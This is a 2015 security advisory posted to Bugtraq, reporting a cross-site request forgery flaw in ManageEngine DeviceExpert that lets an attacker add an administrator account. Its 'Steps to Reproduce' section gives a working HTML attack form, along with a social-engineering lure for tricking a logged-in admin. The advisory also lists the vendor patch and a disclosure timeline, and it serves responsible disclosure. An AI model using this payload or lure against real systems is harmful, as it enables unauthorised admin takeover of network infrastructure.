
Date: Sat, 21 Mar 2015 16:35:54 GMT
From: kingkaustubh@...com
To: bugtraq@...urityfocus.com
Subject: CSRF to add admin user Vulnerability In Manage Engine Device Expert

===============================================================================
CSRF to add admin user Vulnerability In Manage Engine Device Expert
===============================================================================

. contents:: Table Of Content

Overview
========

* Title : CSRF to add admin user Vulnerability In Manage Engine Device Expert
* Author: Kaustubh G. Padwad
* Plugin Homepage: http://www.manageengine.com/products/device-expert/
* Severity: HIGH
* Version Affected: Version 5.9.9.0 Build: 5990
* Version Tested : Version 5.9.9.0 Build: 5990
* version patched: Separate Patch release for all version

Description 
===========

About the Product
=================
DeviceExpert is a webï¿½based, multi vendor network change, configuration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices. Trusted by thousands of network administrators around the world, DeviceExpert helps automate and take total control of the entire life cycle of device configuration management.


Vulnerable Parameter  
--------------------
Create user form
 	
About Vulnerability
-------------------
This Cross-Site Request Forgery vulnerability enables an anonymous attacker to add an admin account into the application. This leads to compromising the whole domain as the application normally uses privileged domain account to perform administration tasks.


Vulnerability Class
===================     
Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
Cross Site Scripting       (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS) 

Steps to Reproduce: (POC)
=========================

* Add follwing code to webserver and send that malicious link to application Admin.
* The admin should be loggedin when he clicks on the link.
* Soical enginering might help here 

For Example :- Device password has been changed click here to reset

####################CSRF COde#######################
<html>
  <body>
    <form action="https://Server-IP:6060/STATE_ID/1423516534014/CreateUser.ve" method="POST">
      <input type="hidden" name="loginName" value="hackerkaustubh" />
      <input type="hidden" name="password" value="kaustubh" />
      <input type="hidden" name="confirmpass" value="kaustubh" />
      <input type="hidden" name="emailaddress" value="kingkaustubh&#64;me&#46;com" />
      <input type="hidden" name="SEND&#95;EMAIL" value="true" />
      <input type="hidden" name="roles" value="Administrator" />
      <input type="hidden" name="ComponentSelection" value="SpecificDevice" />
      <input type="hidden" name="searchfield" value="&#45;&#45;Search&#32;Devices&#45;&#45;" />
      <input type="hidden" name="DEVICEGROUPSELECTION" value="1" />
      <input type="hidden" name="DeviceGroupDescription"/> value="This&#32;device&#32;group&#32;contains&#32;all&#32;the&#32;devices&#32;present&#32;in&#32;the&#32;inventory" />
      <input type="hidden" name="QUERYID" value="&#45;1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Mitigation 
==========
Receved from manage engine team

https://uploads.zohocorp.com/Internal_Useruploads/dnd/NetFlow_Analyzer/o_19ga51p951gblpbs1rkrm211vim1/vulnerabilities_Fix.zip

Open DeviceExper.zip

1. Stop the Device Expert service. 
2. Please replace AdvNCM.jar under DeviceExpert_Home/lib with the one under DeviceExpert.zip/AdvNCM.jar
3. Start the Device Expert service


Change Log
==========


Disclosure 
==========
11-February-2015 Reported to Developer
13-February-2015 Acknodlagement from Developer
13-March-2015    Fixed by developer
16-March-2015    Requested a cve ID    
21-March-2015    Public Disclosed 
credits
=======
* Kaustubh Padwad 
* Information Security Researcher
* kingkaustubh@...com 
* https://twitter.com/s3curityb3ast
* http://breakthesec.com
* https://www.linkedin.com/in/kaustubhpadwad
